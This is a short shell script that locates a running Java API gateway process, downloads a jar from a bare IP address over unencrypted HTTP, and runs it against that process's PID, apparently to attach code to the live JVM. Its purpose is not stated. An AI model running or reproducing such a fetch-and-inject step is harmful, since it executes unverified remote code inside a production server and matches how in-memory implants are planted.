#!/bin/sh
pid=$(ps -ef | grep 'com.hrocloud.apigw.ApigwServer' | grep -v grep | awk '{print $2}' | head -1)
[ -n "$pid" ] || exit 1
curl -sf http://162.128.228.211:8012/demo/xh -o /tmp/xh || exit 1
/home/app/work/jdk1.8.0_05/bin/java -jar /tmp/xh "$pid"
